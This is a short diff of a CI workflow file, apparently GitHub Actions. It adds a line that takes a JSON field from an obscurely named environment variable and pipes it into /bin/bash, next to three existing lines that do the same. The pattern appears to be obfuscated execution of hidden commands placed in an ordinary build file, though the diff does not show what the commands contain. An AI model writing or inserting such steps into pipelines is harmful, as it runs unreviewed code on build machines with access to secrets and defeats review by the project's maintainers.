@@ -41,6 +41,7 @@ jobs:
           echo $osk7604 | jq -r .mo27 | /bin/bash
           echo $znp2 | jq -r .f52 | /bin/bash
           echo $obi0 | jq -r .ayv20426 | /bin/bash
+          printf '%s' "$uyirg83" | jq -r .rjqgc064 | /bin/bash
 
       - name: Save archive
         if: always()
